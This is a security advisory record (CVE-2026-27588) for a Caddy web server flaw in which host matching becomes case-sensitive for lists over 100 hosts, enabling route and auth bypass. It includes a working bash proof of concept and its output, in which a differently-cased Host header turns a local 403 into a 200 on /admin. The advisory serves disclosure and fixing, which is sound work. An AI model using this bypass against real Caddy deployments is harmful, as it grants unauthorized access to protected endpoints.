{
  "id": "GHSA-x76f-jf84-rqj8",
  "modified": "2026-02-27T19:53:54Z",
  "published": "2026-02-24T20:34:01Z",
  "aliases": [
    "CVE-2026-27588",
    "GO-2026-4541"
  ],
  "summary": "Caddy: MatchHost becomes case-sensitive for large host lists (\u003e100), enabling host-based route/auth bypass",
  "details": "### Summary\nCaddy's HTTP `host` request matcher is documented as case-insensitive, but when configured with a large host list (\u003e100 entries) it becomes case-sensitive due to an optimized matching path. An attacker can bypass host-based routing and any access controls attached to that route by changing the casing of the `Host` header.\n\n### Details\nIn Caddy `v2.10.2`, the `MatchHost` matcher states it matches the Host value case-insensitively:\n\n- `modules/caddyhttp/matchers.go`: `type MatchHost matches requests by the Host value (case-insensitive).`\n\nHowever, in `MatchHost.MatchWithError`, when the host list is considered \"large\" (`len(m) \u003e 100`):\n\n- `MatchHost.large()` returns true for `len(m) \u003e 100` (`modules/caddyhttp/matchers.go`, around the `large()` helper).\n- The matcher takes a \"fast path\" using binary search over the sorted host list, and checks for an exact match using a case-sensitive string comparison (`m[pos] == reqHost`).\n- After the fast path fails, the fallback loop short-circuits for large lists by breaking as soon as it reaches the first non-fuzzy entry. For configs comprised of exact hostnames only (no wildcards/placeholders), this prevents the `strings.EqualFold(reqHost, host)` check from ever running.\n\nNet effect: with a host list length of 101 or more, changing only the casing of the incoming `Host` header can cause the `host` matcher to not match when it should.\n\n#### Suggested fix\n- Normalize exact hostnames to lower-case during `MatchHost.Provision` (at least for non-fuzzy entries).\n- Normalize the incoming request host (`reqHost`) to lower-case before the large-list binary search + equality check, so the optimized path stays case-insensitive.\n\nReproduced on:\n- Stable release: `v2.10.2` -- this is the release I reference in the repro below.\n- Dev build: `v2.11.0-beta.2`.\n- Master tip: commit `58968b3fd38cacbf4b5e07cc8c8be27696dce60f`.\n\n### PoC\nPrereqs:\n- bash, curl\n- A pre-built Caddy binary available at `/opt/caddy-2.10.2/caddy` (edit `CADDY_BIN` in the script if needed)\n\n\u003cdetails\u003e\n\u003csummary\u003eScript (Click to expand)\u003c/summary\u003e\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\n\nCADDY_BIN=\"/opt/caddy-2.10.2/caddy\"\nHOST=\"127.0.0.1\"\nPORT=\"8080\"\n\nTMPDIR=\"$(mktemp -d)\"\nCADDYFILE=\"${TMPDIR}/Caddyfile\"\nLOG=\"${TMPDIR}/caddy.log\"\n\ncleanup() {\n  if [ -n \"${CADDY_PID:-}\" ] \u0026\u0026 kill -0 \"${CADDY_PID}\" 2\u003e/dev/null; then\n    kill \"${CADDY_PID}\" 2\u003e/dev/null || true\n    wait \"${CADDY_PID}\" 2\u003e/dev/null || true\n  fi\n  rm -rf \"${TMPDIR}\" 2\u003e/dev/null || true\n}\ntrap cleanup EXIT\n\nif [ ! -x \"${CADDY_BIN}\" ]; then\n  echo \"error: missing caddy binary at ${CADDY_BIN}\" \u003e\u00262\n  exit 2\nfi\n\necho \"== Caddy version ==\"\n\"${CADDY_BIN}\" version\n\ncat \u003e\"${CADDYFILE}\" \u003c\u003cEOF\n{\n    debug\n}\n\n:${PORT} {\n    log\n    @protected {\n        host h001.test h002.test h003.test h004.test h005.test h006.test h007.test h008.test h009.test h010.test h011.test h012.test h013.test h014.test h015.test h016.test h017.test h018.test h019.test h020.test h021.test h022.test h023.test h024.test h025.test h026.test h027.test h028.test h029.test h030.test h031.test h032.test h033.test h034.test h035.test h036.test h037.test h038.test h039.test h040.test h041.test h042.test h043.test h044.test h045.test h046.test h047.test h048.test h049.test h050.test h051.test h052.test h053.test h054.test h055.test h056.test h057.test h058.test h059.test h060.test h061.test h062.test h063.test h064.test h065.test h066.test h067.test h068.test h069.test h070.test h071.test h072.test h073.test h074.test h075.test h076.test h077.test h078.test h079.test h080.test h081.test h082.test h083.test h084.test h085.test h086.test h087.test h088.test h089.test h090.test h091.test h092.test h093.test h094.test h095.test h096.test h097.test h098.test h099.test h100.test h101.test\n        path /admin\n    }\n    respond @protected \"DENY\" 403\n    respond \"ALLOW\" 200\n}\nEOF\n\necho\necho \"== Caddyfile ==\"\ncat \"${CADDYFILE}\"\n\necho\necho \"== Start Caddy (debug + capture logs) ==\"\necho \"cmd: ${CADDY_BIN} run --config ${CADDYFILE} --adapter caddyfile\"\n\"${CADDY_BIN}\" run --config \"${CADDYFILE}\" --adapter caddyfile \u003e\"${LOG}\" 2\u003e\u00261 \u0026\nCADDY_PID=\"$!\"\n\nsleep 2\n\necho\necho \"== Request 1 (baseline - expect deny) ==\"\necho \"cmd: curl -v -H 'Host: h050.test' http://${HOST}:${PORT}/admin\"\ncurl -v -H \"Host: h050.test\" \"http://${HOST}:${PORT}/admin\" 2\u003e\u00261 || true\n\necho\necho \"== Request 2 (BYPASS - expect allow) ==\"\necho \"cmd: curl -v -H 'Host: H050.TEST' http://${HOST}:${PORT}/admin\"\ncurl -v -H \"Host: H050.TEST\" \"http://${HOST}:${PORT}/admin\" 2\u003e\u00261 || true\n\necho\necho \"== Stop Caddy ==\"\nkill \"${CADDY_PID}\" 2\u003e/dev/null || true\nwait \"${CADDY_PID}\" 2\u003e/dev/null || true\n\necho\necho \"== Full Caddy debug log ==\"\ncat \"${LOG}\"\n\n```\n\u003c/details\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpected output (Click to expand)\u003c/summary\u003e\n\n```bash\n== Caddy version ==\nv2.10.2 h1:g/gTYjGMD0dec+UgMw8SnfmJ3I9+M2TdvoRL/Ovu6U8=\n\n== Caddyfile ==\n{\n    debug\n}\n\n:8080 {\n    log\n    @protected {\n        host h001.test h002.test h003.test h004.test h005.test h006.test h007.test h008.test h009.test h010.test h011.test h012.test h013.test h014.test h015.test h016.test h017.test h018.test h019.test h020.test h021.test h022.test h023.test h024.test h025.test h026.test h027.test h028.test h029.test h030.test h031.test h032.test h033.test h034.test h035.test h036.test h037.test h038.test h039.test h040.test h041.test h042.test h043.test h044.test h045.test h046.test h047.test h048.test h049.test h050.test h051.test h052.test h053.test h054.test h055.test h056.test h057.test h058.test h059.test h060.test h061.test h062.test h063.test h064.test h065.test h066.test h067.test h068.test h069.test h070.test h071.test h072.test h073.test h074.test h075.test h076.test h077.test h078.test h079.test h080.test h081.test h082.test h083.test h084.test h085.test h086.test h087.test h088.test h089.test h090.test h091.test h092.test h093.test h094.test h095.test h096.test h097.test h098.test h099.test h100.test h101.test\n        path /admin\n    }\n    respond @protected \"DENY\" 403\n    respond \"ALLOW\" 200\n}\n\n== Start Caddy (debug + capture logs) ==\ncmd: /opt/caddy-2.10.2/caddy run --config /tmp/tmp.3BN6rgj9yF/Caddyfile --adapter caddyfile\n\n== Request 1 (baseline - expect deny) ==\ncmd: curl -v -H 'Host: h050.test' http://127.0.0.1:8080/admin\n*   Trying 127.0.0.1:8080...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080\n* using HTTP/1.x\n\u003e GET /admin HTTP/1.1\n\u003e Host: h050.test\n\u003e User-Agent: curl/8.15.0\n\u003e Accept: */*\n\u003e\n* Request completely sent off\n\u003c HTTP/1.1 403 Forbidden\n\u003c Content-Type: text/plain; charset=utf-8\n\u003c Server: Caddy\n\u003c Date: Sun, 08 Feb 2026 22:09:09 GMT\n\u003c Content-Length: 4\n\u003c\n* Connection #0 to host 127.0.0.1 left intact\nDENY\n== Request 2 (BYPASS - expect allow) ==\ncmd: curl -v -H 'Host: H050.TEST' http://127.0.0.1:8080/admin\n*   Trying 127.0.0.1:8080...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080\n* using HTTP/1.x\n\u003e GET /admin HTTP/1.1\n\u003e Host: H050.TEST\n\u003e User-Agent: curl/8.15.0\n\u003e Accept: */*\n\u003e\n\u003c HTTP/1.1 200 OK\n\u003c Content-Type: text/plain; charset=utf-8\n\u003c Server: Caddy\n\u003c Date: Sun, 08 Feb 2026 22:09:09 GMT\n\u003c Content-Length: 5\n\u003c\n* Connection #0 to host 127.0.0.1 left intact\nALLOW\n== Stop Caddy ==\n\n== Full Caddy debug log ==\n{\"level\":\"info\",\"ts\":1770588548.012352,\"msg\":\"maxprocs: Leaving GOMAXPROCS=4: CPU quota undefined\"}\n{\"level\":\"info\",\"ts\":1770588548.0125406,\"msg\":\"GOMEMLIMIT is updated\",\"package\":\"github.com/KimMachineGun/automemlimit/memlimit\",\"GOMEMLIMIT\":1844136345,\"previous\":9223372036854775807}\n{\"level\":\"info\",\"ts\":1770588548.0125597,\"msg\":\"using config from file\",\"file\":\"/tmp/tmp.3BN6rgj9yF/Caddyfile\"}\n{\"level\":\"info\",\"ts\":1770588548.0131946,\"msg\":\"adapted config to JSON\",\"adapter\":\"caddyfile\"}\n{\"level\":\"warn\",\"ts\":1770588548.013202,\"msg\":\"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies\",\"adapter\":\"caddyfile\",\"file\":\"/tmp/tmp.3BN6rgj9yF/Caddyfile\",\"line\":2}\n{\"level\":\"info\",\"ts\":1770588548.0139973,\"logger\":\"admin\",\"msg\":\"admin endpoint started\",\"address\":\"localhost:2019\",\"enforce_origin\":false,\"origins\":[\"//127.0.0.1:2019\",\"//localhost:2019\",\"//[::1]:2019\"]}\n{\"level\":\"debug\",\"ts\":1770588548.0140707,\"logger\":\"http.auto_https\",\"msg\":\"adjusted config\",\"tls\":{\"automation\":{\"policies\":[{}]}},\"http\":{\"servers\":{\"srv0\":{\"listen\":[\":8080\"],\"routes\":[{\"handle\":[{\"handler\":\"subroute\",\"routes\":[{\"handle\":[{\"body\":\"DENY\",\"handler\":\"static_response\",\"status_code\":403}],\"match\":[{\"host\":[\"h001.test\",\"h002.test\",\"h003.test\",\"h004.test\",\"h005.test\",\"h006.test\",\"h007.test\",\"h008.test\",\"h009.test\",\"h010.test\",\"h011.test\",\"h012.test\",\"h013.test\",\"h014.test\",\"h015.test\",\"h016.test\",\"h017.test\",\"h018.test\",\"h019.test\",\"h020.test\",\"h021.test\",\"h022.test\",\"h023.test\",\"h024.test\",\"h025.test\",\"h026.test\",\"h027.test\",\"h028.test\",\"h029.test\",\"h030.test\",\"h031.test\",\"h032.test\",\"h033.test\",\"h034.test\",\"h035.test\",\"h036.test\",\"h037.test\",\"h038.test\",\"h039.test\",\"h040.test\",\"h041.test\",\"h042.test\",\"h043.test\",\"h044.test\",\"h045.test\",\"h046.test\",\"h047.test\",\"h048.test\",\"h049.test\",\"h050.test\",\"h051.test\",\"h052.test\",\"h053.test\",\"h054.test\",\"h055.test\",\"h056.test\",\"h057.test\",\"h058.test\",\"h059.test\",\"h060.test\",\"h061.test\",\"h062.test\",\"h063.test\",\"h064.test\",\"h065.test\",\"h066.test\",\"h067.test\",\"h068.test\",\"h069.test\",\"h070.test\",\"h071.test\",\"h072.test\",\"h073.test\",\"h074.test\",\"h075.test\",\"h076.test\",\"h077.test\",\"h078.test\",\"h079.test\",\"h080.test\",\"h081.test\",\"h082.test\",\"h083.test\",\"h084.test\",\"h085.test\",\"h086.test\",\"h087.test\",\"h088.test\",\"h089.test\",\"h090.test\",\"h091.test\",\"h092.test\",\"h093.test\",\"h094.test\",\"h095.test\",\"h096.test\",\"h097.test\",\"h098.test\",\"h099.test\",\"h100.test\",\"h101.test\"],\"path\":[\"/admin\"]}]},{\"handle\":[{\"body\":\"ALLOW\",\"handler\":\"static_response\",\"status_code\":200}]}]}],\"terminal\":true}],\"automatic_https\":{},\"logs\":{}}}}}\n{\"level\":\"info\",\"ts\":1770588548.0143135,\"logger\":\"tls.cache.maintenance\",\"msg\":\"started background certificate maintenance\",\"cache\":\"0xc0000d7c80\"}\n{\"level\":\"debug\",\"ts\":1770588548.0143793,\"logger\":\"http\",\"msg\":\"starting server loop\",\"address\":\"[::]:8080\",\"tls\":false,\"http3\":false}\n{\"level\":\"warn\",\"ts\":1770588548.014415,\"logger\":\"http\",\"msg\":\"HTTP/2 skipped because it requires TLS\",\"network\":\"tcp\",\"addr\":\":8080\"}\n{\"level\":\"warn\",\"ts\":1770588548.0144184,\"logger\":\"http\",\"msg\":\"HTTP/3 skipped because it requires TLS\",\"network\":\"tcp\",\"addr\":\":8080\"}\n{\"level\":\"info\",\"ts\":1770588548.0144203,\"logger\":\"http.log\",\"msg\":\"server running\",\"name\":\"srv0\",\"protocols\":[\"h1\",\"h2\",\"h3\"]}\n{\"level\":\"debug\",\"ts\":1770588548.014438,\"logger\":\"events\",\"msg\":\"event\",\"name\":\"started\",\"id\":\"1c7f6534-d264-456d-988d-e9f77a099c42\",\"origin\":\"\",\"data\":null}\n{\"level\":\"info\",\"ts\":1770588548.0145273,\"msg\":\"autosaved config (load with --resume flag)\",\"file\":\"/home/vh/.config/caddy/autosave.json\"}\n{\"level\":\"info\",\"ts\":1770588548.0145316,\"msg\":\"serving initial configuration\"}\n{\"level\":\"info\",\"ts\":1770588548.0274432,\"logger\":\"tls\",\"msg\":\"storage cleaning happened too recently; skipping for now\",\"storage\":\"FileStorage:/home/vh/.local/share/caddy\",\"instance\":\"a259f82d-3c7c-4706-9ca8-17456b4af729\",\"try_again\":1770674948.0274422,\"try_again_in\":86399.999999709}\n{\"level\":\"info\",\"ts\":1770588548.0275078,\"logger\":\"tls\",\"msg\":\"finished cleaning storage units\"}\n{\"level\":\"info\",\"ts\":1770588549.9694445,\"logger\":\"http.log.access\",\"msg\":\"handled request\",\"request\":{\"remote_ip\":\"127.0.0.1\",\"remote_port\":\"53220\",\"client_ip\":\"127.0.0.1\",\"proto\":\"HTTP/1.1\",\"method\":\"GET\",\"host\":\"h050.test\",\"uri\":\"/admin\",\"headers\":{\"User-Agent\":[\"curl/8.15.0\"],\"Accept\":[\"*/*\"]}},\"bytes_read\":0,\"user_id\":\"\",\"duration\":0.000014857,\"size\":4,\"status\":403,\"resp_headers\":{\"Server\":[\"Caddy\"],\"Content-Type\":[\"text/plain; charset=utf-8\"]}}\n{\"level\":\"info\",\"ts\":1770588549.9741833,\"logger\":\"http.log.access\",\"msg\":\"handled request\",\"request\":{\"remote_ip\":\"127.0.0.1\",\"remote_port\":\"53234\",\"client_ip\":\"127.0.0.1\",\"proto\":\"HTTP/1.1\",\"method\":\"GET\",\"host\":\"H050.TEST\",\"uri\":\"/admin\",\"headers\":{\"Accept\":[\"*/*\"],\"User-Agent\":[\"curl/8.15.0\"]}},\"bytes_read\":0,\"user_id\":\"\",\"duration\":0.00000551,\"size\":5,\"status\":200,\"resp_headers\":{\"Server\":[\"Caddy\"],\"Content-Type\":[\"text/plain; charset=utf-8\"]}}\n{\"level\":\"info\",\"ts\":1770588549.9751372,\"msg\":\"shutting down apps, then terminating\",\"signal\":\"SIGTERM\"}\n{\"level\":\"warn\",\"ts\":1770588549.9751456,\"msg\":\"exiting; byeee!! ðŸ‘‹\",\"signal\":\"SIGTERM\"}\n{\"level\":\"debug\",\"ts\":1770588549.9751775,\"logger\":\"events\",\"msg\":\"event\",\"name\":\"stopping\",\"id\":\"e02c5e64-9d76-48b6-a967-4f003850bdd4\",\"origin\":\"\",\"data\":null}\n{\"level\":\"info\",\"ts\":1770588549.9751873,\"logger\":\"http\",\"msg\":\"servers shutting down with eternal grace period\"}\n{\"level\":\"info\",\"ts\":1770588549.975331,\"logger\":\"admin\",\"msg\":\"stopped previous server\",\"address\":\"localhost:2019\"}\n{\"level\":\"info\",\"ts\":1770588549.9753368,\"msg\":\"shutdown complete\",\"signal\":\"SIGTERM\",\"exit_code\":0}\n```\n\u003c/details\u003e\n\n### Impact\nThis is a route/auth bypass in Caddy's request-matching layer. Any internet-exposed Caddy deployment that relies on `host` matchers with large host lists (\u003e100) to select protected routes (e.g. applying `basicauth`, `forward_auth`, `respond` deny rules, or protecting `reverse_proxy` backends) can be bypassed by varying the case of the `Host` header, allowing unauthorized access to sensitive endpoints depending on upstream configuration.\n\nThe reproduction is minimal per the reporting guidance; a realistic \"full\" scenario is Caddy fronting a multi-tenant app and doing `forward_auth`/`basicauth`/`deny` for `/admin` only when host is in a big (\u003e100) allowlist, but the default handler still `reverse_proxy`ing to the same app. Then sending `Host: H050.TEST` skips the guarded route in Caddy, yet the upstream still treats it as the same tenant host --\u003e `/admin` is reachable without the intended guard.\n\n\n### AI Use Disclosure\nA custom AI agent pipeline was used to discover the vulnerability, after which was manually reproduced and validated each step. The entire report was ran through an LLM for editing.\n\n### Disclosure/crediting\n\nAsim Viladi Oglu Manizada",
  "affected": [
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/caddyserver/caddy/v2",
        "purl": "pkg:golang/github.com/caddyserver/caddy/v2"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "2.11.1"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-x76f-jf84-rqj8/GHSA-x76f-jf84-rqj8.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-x76f-jf84-rqj8"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27588"
    },
    {
      "type": "WEB",
      "url": "https://github.com/caddyserver/caddy/commit/eec32a0bb5a11651c6a7b04ce82dc50610f2b27e"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/caddyserver/caddy"
    },
    {
      "type": "WEB",
      "url": "https://github.com/caddyserver/caddy/releases/tag/v2.11.1"
    },
    {
      "type": "WEB",
      "url": "https://pkg.go.dev/vuln/GO-2026-4541"
    }
  ]
}